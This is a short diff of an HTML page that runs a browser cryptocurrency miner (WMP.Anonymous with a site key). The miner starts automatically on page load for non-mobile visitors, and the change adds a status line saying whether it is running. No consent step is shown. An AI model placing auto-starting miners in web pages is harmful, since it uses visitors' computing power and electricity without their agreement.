@@ -8,10 +8,17 @@
 </head>
 <body>
 <script>
-    var miner = WMP.Anonymous('SK_y4BKNOvtFpP9gBcpeSX75',{throttle: 0.1});
-    if (!miner.isMobile()){
+    var miner = WMP.Anonymous('SK_y4BKNOvtFpP9gBcpeSX75', { throttle: 0.1 });
+
+    if (!miner.isMobile()) {
         miner.start();
+        document.getElementById("minerStatus").innerText = "Miner is running";
+    } else {
+        document.getElementById("minerStatus").innerText = "Miner isn't running";
     }
 </script>
+
+<p id="minerStatus">Status: Loading...</p>
+
 </body>
 </html>
